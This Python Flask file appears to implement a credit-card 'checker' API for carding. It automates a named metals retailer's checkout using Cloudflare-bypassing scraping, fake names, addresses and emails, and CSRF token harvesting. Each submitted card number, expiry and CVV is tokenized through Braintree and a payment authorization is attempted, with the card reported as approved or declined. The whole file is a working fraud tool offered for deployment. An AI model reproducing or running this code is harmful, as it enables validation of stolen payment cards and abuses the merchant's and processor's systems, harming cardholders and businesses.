"""
OnlineMetals B3 Auth — Flask/Vercel API
Mirrors working local chain: cloudscraper + full CSRFToken walk.
GET /api/check?cc=cc|mm|yy|cvc
"""

from flask import Flask, request, jsonify
import re, os, json, time, base64, random
import cloudscraper
import requests as std_requests

app = Flask(__name__)

UA   = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36"
BASE = "https://www.onlinemetals.com"

def vessali_random():
    return str(random.randint(1000000000, 9999999999))

def gmail():
    return f"vessali{vessali_random()}@gmail.com"

def ext(pat, text, default=None):
    m = re.search(pat, text)
    return m.group(1) if m else default

def scrub(msg: str) -> str:
    if not msg:
        return ""
    msg = re.sub(r'https?://\S+', '[redacted]', msg)
    return msg.strip()

def make_scraper():
    s = cloudscraper.create_scraper(
        browser={'browser': 'chrome', 'platform': 'windows', 'desktop': True}
    )
    return s

def check_card(line):
    p = line.strip().split("|")
    if len(p) != 4:
        return line, "BadFormat", "need cc|mm|yy|cvc"
    cc, mm, yy, cvc = p
    scraper = make_scraper()
    email = gmail()

    # ── 1. index product page, grab csrf + page uuid ────────────
    r = scraper.get(f"{BASE}/en/buy/hex-bar", headers={
        'User-Agent': UA,
        'Accept': "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
        'cache-control': "max-age=0",
        'sec-ch-ua': "\"Not;A=Brand\";v=\"8\", \"Chromium\";v=\"150\", \"Google Chrome\";v=\"150\"",
        'sec-ch-ua-mobile': "?0",
        'sec-ch-ua-platform': "\"Windows\"",
        'upgrade-insecure-requests': "1",
        'sec-fetch-site': "none",
        'sec-fetch-mode': "navigate",
        'sec-fetch-user': "?1",
        'sec-fetch-dest': "document",
        'accept-language': "en-US,en;q=0.9",
        'priority': "u=0, i",
    }, timeout=30)
    csrf = ext(r'name="CSRFToken" value="([^"]+)"', r.text)
    result = ext(r'smartedit-page-uuid-([A-Za-z0-9+/=]+)', r.text)
    if not csrf or not result:
        return line, "CloudflareBlocked", f"http={r.status_code} len={len(r.text)}"

    # ── 2. add to cart ──────────────────────────────────────────
    scraper.post(f"{BASE}/en/tkaddtocart/add", headers={
        'User-Agent': UA,
        'sec-ch-ua-platform': "\"Windows\"",
        'x-requested-with': "XMLHttpRequest",
        'sec-ch-ua': "\"Not;A=Brand\";v=\"8\", \"Chromium\";v=\"150\", \"Google Chrome\";v=\"150\"",
        'sec-ch-ua-mobile': "?0",
        'origin': "https://www.onlinemetals.com",
        'sec-fetch-site': "same-origin",
        'sec-fetch-mode': "cors",
        'sec-fetch-dest': "empty",
        'referer': "https://www.onlinemetals.com/en/buy/hex-bar",
        'accept-language': "en-US,en;q=0.9",
        'priority': "u=1, i",
    }, data={
        'CSRFToken': csrf,
        'isHeatRequried': "false",
        'enableStockCheckForPages': "true",
        'isMarketplaceProduct': "false",
        'moreSeller': "false",
        'productCodePost': "1306_12_0",
        'baseProduct': "1306",
        'dealsBaseMsg': "",
        'pieceQtyDiscount': "",
        'qty': "1",
        'offerCode': "",
        'productCode': "1306",
        'eventSource': f"page-productGrid+pageType-CategoryPage+template-pages-addon--thyssenkruppnastorefrontaddon-pages-product-productListPage+smartedit-page-uid-productGrid+smartedit-page-uuid-{result}+smartedit-catalog-version-uuid-olmContentCatalog/Online+language-en+sticky-header",
        'popUpText': "Unknown",
        'buyBoxWinner': "true",
        'is3pCompeteProduct': "false",
    }, timeout=30)

    # ── 3. cart page, grab csrf1 ────────────────────────────────
    r = scraper.get(f"{BASE}/en/cart",
        params={'eventSource': f"page-productGrid pageType-CategoryPage template-pages-addon--thyssenkruppnastorefrontaddon-pages-product-productListPage smartedit-page-uid-productGrid smartedit-page-uuid-{result} smartedit-catalog-version-uuid-olmContentCatalog/Online language-en sticky-header"},
        headers={
        'User-Agent': UA,
        'Accept': "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
        'sec-ch-ua': "\"Not;A=Brand\";v=\"8\", \"Chromium\";v=\"150\", \"Google Chrome\";v=\"150\"",
        'sec-ch-ua-mobile': "?0",
        'sec-ch-ua-platform': "\"Windows\"",
        'upgrade-insecure-requests': "1",
        'sec-fetch-site': "same-origin",
        'sec-fetch-mode': "navigate",
        'sec-fetch-user': "?1",
        'sec-fetch-dest': "document",
        'referer': "https://www.onlinemetals.com/en/buy/hex-bar",
        'accept-language': "en-US,en;q=0.9",
        'priority': "u=0, i",
    }, timeout=30)
    csrf1 = ext(r'name="CSRFToken" value="([^"]+)"', r.text)
    if not csrf1:
        return line, "Declined", f"stage2 no csrf1 http={r.status_code}"

    # ── 4. loyalty + page-visited ───────────────────────────────
    scraper.get(f"{BASE}/emarsys/loyalty/generateToken", headers={
        'User-Agent': UA,
        'sec-ch-ua-platform': "\"Windows\"",
        'sec-ch-ua': "\"Not;A=Brand\";v=\"8\", \"Chromium\";v=\"150\", \"Google Chrome\";v=\"150\"",
        'sec-ch-ua-mobile': "?0",
        'sec-fetch-site': "same-origin",
        'sec-fetch-mode': "cors",
        'sec-fetch-dest': "empty",
        'referer': "https://www.onlinemetals.com/en/cart",
        'accept-language': "en-US,en;q=0.9",
        'priority': "u=1, i",
    }, timeout=30)

    scraper.post(f"{BASE}/en/cart/update-page-visited", headers={
        'User-Agent': UA,
        'sec-ch-ua-platform': "\"Windows\"",
        'x-requested-with': "XMLHttpRequest",
        'sec-ch-ua': "\"Not;A=Brand\";v=\"8\", \"Chromium\";v=\"150\", \"Google Chrome\";v=\"150\"",
        'sec-ch-ua-mobile': "?0",
        'origin': "https://www.onlinemetals.com",
        'sec-fetch-site': "same-origin",
        'sec-fetch-mode': "cors",
        'sec-fetch-dest': "empty",
        'referer': "https://www.onlinemetals.com/en/cart",
        'accept-language': "en-US,en;q=0.9",
        'priority': "u=1, i",
    }, data={'CSRFToken': csrf1, 'pageType': "cart"}, timeout=30)

    # ── 5. walk checkout pages, collect csrf2 ───────────────────
    for u in ["/en/checkout", "/en/checkout/multi",
              "/en/checkout/multi/delivery-address/add-address"]:
        r = scraper.get(BASE + u, headers={
            'User-Agent': UA,
            'Accept': "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
            'upgrade-insecure-requests': "1",
            'sec-fetch-site': "same-origin",
            'sec-fetch-mode': "navigate",
            'sec-fetch-user': "?1",
            'sec-fetch-dest': "document",
            'sec-ch-ua': "\"Not;A=Brand\";v=\"8\", \"Chromium\";v=\"150\", \"Google Chrome\";v=\"150\"",
            'sec-ch-ua-mobile': "?0",
            'sec-ch-ua-platform': "\"Windows\"",
            'referer': "https://www.onlinemetals.com/en/cart",
            'accept-language': "en-US,en;q=0.9",
            'priority': "u=0, i",
        }, timeout=30)
    csrf2 = ext(r'name="CSRFToken" value="([^"]+)"', r.text)
    if not csrf2:
        return line, "Declined", f"stage3 no csrf2 http={r.status_code}"

    # ── 6. preferences + address validation + address ───────────
    scraper.post(f"{BASE}/en/checkout/update-preferences",
        params={'CSRFToken': csrf2},
        headers={
        'User-Agent': UA,
        'Content-Type': "application/json",
        'sec-ch-ua-platform': "\"Windows\"",
        'x-requested-with': "XMLHttpRequest",
        'sec-ch-ua': "\"Not;A=Brand\";v=\"8\", \"Chromium\";v=\"150\", \"Google Chrome\";v=\"150\"",
        'sec-ch-ua-mobile': "?0",
        'origin': "https://www.onlinemetals.com",
        'sec-fetch-site': "same-origin",
        'sec-fetch-mode': "cors",
        'sec-fetch-dest': "empty",
        'referer': "https://www.onlinemetals.com/en/checkout/multi/delivery-address/add-address",
        'accept-language': "en-US,en;q=0.9",
        'priority': "u=1, i",
    }, data=json.dumps({"enableRegistration": True,
                        "enrollInEmarsysLoyalty": False,
                        "emailOptInToNewsAndOffers": True}), timeout=30)

    r = scraper.post(f"{BASE}/en/checkout/multi/delivery-address/add-address-validation",
        headers={
        'User-Agent': UA,
        'sec-ch-ua-platform': "\"Windows\"",
        'x-requested-with': "XMLHttpRequest",
        'sec-ch-ua': "\"Not;A=Brand\";v=\"8\", \"Chromium\";v=\"150\", \"Google Chrome\";v=\"150\"",
        'sec-ch-ua-mobile': "?0",
        'origin': "https://www.onlinemetals.com",
        'sec-fetch-site': "same-origin",
        'sec-fetch-mode': "cors",
        'sec-fetch-dest': "empty",
        'referer': "https://www.onlinemetals.com/en/checkout/multi/delivery-address/add-address",
        'accept-language': "en-US,en;q=0.9",
        'priority': "u=1, i",
    }, data={
        'CSRFToken': csrf2, 'shippingAddress': "true", 'emailCoupon': "false",
        'firstName': "Vessa", 'lastName': "Liuis", 'email': email,
        'companyName': "None", 'line1': "123+Allen+Street", 'line2': "",
        'townCity': "New+York", 'regionIso': "US-NY", 'postcode': "10001",
        'countryIso': "US", 'phone': "2012455464", 'ext': "", 'fax': "",
    }, timeout=30)
    csrf3 = ext(r'name="CSRFToken" value="([^"]+)"', r.text) or csrf2

    r = scraper.post(f"{BASE}/en/checkout/multi/delivery-address/add-address",
        headers={
        'User-Agent': UA,
        'Accept': "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
        'cache-control': "max-age=0",
        'sec-ch-ua': "\"Not;A=Brand\";v=\"8\", \"Chromium\";v=\"150\", \"Google Chrome\";v=\"150\"",
        'sec-ch-ua-mobile': "?0",
        'sec-ch-ua-platform': "\"Windows\"",
        'upgrade-insecure-requests': "1",
        'origin': "https://www.onlinemetals.com",
        'sec-fetch-site': "same-origin",
        'sec-fetch-mode': "navigate",
        'sec-fetch-user': "?1",
        'sec-fetch-dest': "document",
        'referer': "https://www.onlinemetals.com/en/checkout/multi/delivery-address/add-address",
        'accept-language': "en-US,en;q=0.9",
        'priority': "u=0, i",
    }, data={
        'shippingAddress': "true", 'emailCoupon': "false", 'CSRFToken': csrf3,
        'firstName': "Vessa", 'lastName': "Liuis", 'email': email,
        'companyName': "None", 'line1': "123+ALLEN+ST", 'line2': "",
        'townCity': "NEW+YORK", 'regionIso': "US-NY", 'postcode': "10002-3024",
        'countryIso': "US", 'phone': "2012455464", 'ext': "", 'fax': "",
        'suggestionAddress': "on",
    }, timeout=30)
    csrf4 = ext(r'name="CSRFToken" value="([^"]+)"', r.text)
    if not csrf4:
        return line, "Declined", f"stage4 no csrf4 http={r.status_code}"

    # ── 7. delivery method ──────────────────────────────────────
    scraper.post(f"{BASE}/en/checkout/multi/delivery-method/setDeliveryMode",
        headers={
        'User-Agent': UA,
        'sec-ch-ua-platform': "\"Windows\"",
        'x-requested-with': "XMLHttpRequest",
        'sec-ch-ua': "\"Not;A=Brand\";v=\"8\", \"Chromium\";v=\"150\", \"Google Chrome\";v=\"150\"",
        'sec-ch-ua-mobile': "?0",
        'origin': "https://www.onlinemetals.com",
        'sec-fetch-site': "same-origin",
        'sec-fetch-mode': "cors",
        'sec-fetch-dest': "empty",
        'referer': "https://www.onlinemetals.com/en/checkout/multi/delivery-method/select-method",
        'accept-language': "en-US,en;q=0.9",
        'priority': "u=1, i",
    }, data={'CSRFToken': csrf4, 'entryNumbers': "0",
             'selectedDeliveryMode': "WILL_CALL", 'isDirectShip': "true"}, timeout=30)

    # ── 8. billing address ──────────────────────────────────────
    r = scraper.get(f"{BASE}/en/checkout/multi/billing-address/add-address",
        headers={
        'User-Agent': UA,
        'sec-ch-ua-platform': "\"Windows\"",
        'x-requested-with': "XMLHttpRequest",
        'sec-ch-ua': "\"Not;A=Brand\";v=\"8\", \"Chromium\";v=\"150\", \"Google Chrome\";v=\"150\"",
        'sec-ch-ua-mobile': "?0",
        'origin': "https://www.onlinemetals.com",
        'sec-fetch-site': "same-origin",
        'sec-fetch-mode': "cors",
        'sec-fetch-dest': "empty",
        'referer': "https://www.onlinemetals.com/en/checkout/multi/delivery-method/select-method",
        'accept-language': "en-US,en;q=0.9",
        'priority': "u=1, i",
    }, timeout=30)
    csrf5 = ext(r'name="CSRFToken" value="([^"]+)"', r.text)
    if not csrf5:
        return line, "Declined", f"stage5 no csrf5 http={r.status_code}"

    scraper.post(f"{BASE}/en/checkout/multi/billing-address/add-address",
        headers={
        'User-Agent': UA,
        'sec-ch-ua-platform': "\"Windows\"",
        'x-requested-with': "XMLHttpRequest",
        'sec-ch-ua': "\"Not;A=Brand\";v=\"8\", \"Chromium\";v=\"150\", \"Google Chrome\";v=\"150\"",
        'sec-ch-ua-mobile': "?0",
        'origin': "https://www.onlinemetals.com",
        'sec-fetch-site': "same-origin",
        'sec-fetch-mode': "cors",
        'sec-fetch-dest': "empty",
        'referer': "https://www.onlinemetals.com/en/checkout/multi/billing-address/add-address",
        'accept-language': "en-US,en;q=0.9",
        'priority': "u=1, i",
    }, data={
        'billingAddress': "true", 'sameAsShipping': "on", 'CSRFToken': csrf5,
        'firstName': "", 'lastName': "", 'email': "", 'companyName': "",
        'line1': "", 'line2': "", 'townCity': "", 'regionIso': "US-CA",
        'postcode': "", 'countryIso': "US", 'phone': "", 'ext': "", 'fax': "",
        'jobTitle': "select", 'businessType': "select", 'businessSize': "select"}, timeout=30)

    # ── 9. payment page, grab csrf6 + paymentToken ──────────────
    r = scraper.get(f"{BASE}/en/checkout/multi/payment-method/add-payment",
        headers={
        'User-Agent': UA,
        'sec-ch-ua-platform': "\"Windows\"",
        'x-requested-with': "XMLHttpRequest",
        'sec-ch-ua': "\"Not;A=Brand\";v=\"8\", \"Chromium\";v=\"150\", \"Google Chrome\";v=\"150\"",
        'sec-ch-ua-mobile': "?0",
        'origin': "https://www.onlinemetals.com",
        'sec-fetch-site': "same-origin",
        'sec-fetch-mode': "cors",
        'sec-fetch-dest': "empty",
        'referer': "https://www.onlinemetals.com/en/checkout/multi/billing-address/add-address",
        'accept-language': "en-US,en;q=0.9",
        'priority': "u=1, i",
    }, timeout=30)
    csrf6 = ext(r'name="CSRFToken" value="([^"]+)"', r.text)
    payment_token = ext(r'ACC\.config\.paymentToken\s*=\s*["\']([^"\']+)["\']', r.text)
    if not csrf6 or not payment_token:
        return line, "Declined", f"stage6 no csrf6/paymentToken http={r.status_code}"

    # ── 10. decode payment token ───────────────────────────────
    auth = ''
    try:
        auth = json.loads(payment_token).get('authorizationFingerprint', '')
    except json.JSONDecodeError:
        try:
            auth = json.loads(base64.b64decode(payment_token).decode('utf-8')).get('authorizationFingerprint', '')
        except Exception:
            pass
    if not auth:
        return line, "TokenError", f"auth empty ptok={payment_token[:80]}"

    # ── 11. tokenize card via braintree ────────────────────────
    try:
        bt_json = std_requests.post("https://payments.braintree-api.com/graphql",
            headers={
                'User-Agent': UA,
                'Content-Type': "application/json",
                'sec-ch-ua-platform': "\"Windows\"",
                'authorization': f"Bearer {auth}",
                'braintree-version': "2018-05-10",
                'sec-ch-ua': "\"Not;A=Brand\";v=\"8\", \"Chromium\";v=\"150\", \"Google Chrome\";v=\"150\"",
                'sec-ch-ua-mobile': "?0",
                'origin': "https://assets.braintreegateway.com",
                'sec-fetch-site': "cross-site",
                'sec-fetch-mode': "cors",
                'sec-fetch-dest': "empty",
                'referer': "https://assets.braintreegateway.com/",
                'accept-language': "en-US,en;q=0.9",
                'priority': "u=1, i",
            }, timeout=30,
            data=json.dumps({
                "clientSdkMetadata": {"source": "client", "integration": "dropin2",
                                      "sessionId": "59052a2b-776f-49f8-b602-6ebb19538522"},
                "query": "mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }",
                "variables": {"input": {"creditCard": {
                    "number": cc, "expirationMonth": mm, "expirationYear": yy,
                    "cvv": cvc, "billingAddress": {"postalCode": "10001"}},
                    "options": {"validate": False}}},
                "operationName": "TokenizeCreditCard"})).json()
    except Exception as e:
        return line, "NetworkError", f"braintree: {str(e)[:150]}"

    token = bt_json.get('data', {}).get('tokenizeCreditCard', {}).get('token', '')
    if not token:
        return line, "TokenError", f"bt={json.dumps(bt_json)[:400]}"

    # ── 12. save-payment (final auth) ──────────────────────────
    r = scraper.post(f"{BASE}/en/checkout/multi/payment-method/save-payment",
        params={'CSRFToken': csrf6},
        headers={
        'User-Agent': UA,
        'sec-ch-ua-platform': "\"Windows\"",
        'x-requested-with': "XMLHttpRequest",
        'sec-ch-ua': "\"Not;A=Brand\";v=\"8\", \"Chromium\";v=\"150\", \"Google Chrome\";v=\"150\"",
        'sec-ch-ua-mobile': "?0",
        'origin': "https://www.onlinemetals.com",
        'sec-fetch-site': "same-origin",
        'sec-fetch-mode': "cors",
        'sec-fetch-dest': "empty",
        'referer': "https://www.onlinemetals.com/en/checkout/multi/payment-method/add-payment",
        'accept-language': "en-US,en;q=0.9",
        'priority': "u=0, i",
    }, data={'nonce': token,
             'deviceData': "{\"correlation_id\":\"59052a2b-776f-49f8-b602-6ebb1953\"}"}, timeout=30)

    if "saved" in r.text.lower():
        return line, "Approved", ""
    body = r.text[:400]
    if "2105" in body:
        return line, "Declined_2105", body
    return line, "Declined", f"save_http={r.status_code} body={body}"


# ── FLASK ROUTES ───────────────────────────────────────────────
@app.route('/', methods=['GET'])
def home():
    return jsonify({
        'status': 'active',
        'gateway': 'OnlineMetals — Braintree',
        'endpoints': {'/api/check': 'GET ?cc=number|mm|yy|cvv',
                      '/api/health': 'GET'}
    })

@app.route('/api/health', methods=['GET'])
def health():
    return jsonify({'status': 'healthy', 'ts': time.time()})

@app.route('/api/check', methods=['GET'])
def api_check():
    raw = request.args.get('cc', '').strip()
    if not raw:
        return jsonify({'status': 'error', 'message': 'missing cc param'}), 400
    if len(raw.split('|')) != 4:
        return jsonify({'status': 'error', 'message': 'use cc|mm|yy|cvv'}), 400
    try:
        line, status, extra = check_card(raw)
    except Exception as e:
        return jsonify({'status': 'error', 'message': scrub(str(e))}), 500

    if status == "Approved":
        return jsonify({'status': 'approved', 'message': 'Auth Successfully',
                        'card': raw.split('|')[0][:6] + '******' + raw.split('|')[0][-4:]}), 200
    if status == "Declined_2105":
        return jsonify({'status': 'declined', 'message': 'PROCESSOR_DECLINED : 2105',
                        'raw': scrub(extra)}), 200
    return jsonify({'status': 'declined', 'message': status,
                    'raw': scrub(extra)}), 200


if __name__ == '__main__':
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 5000)))
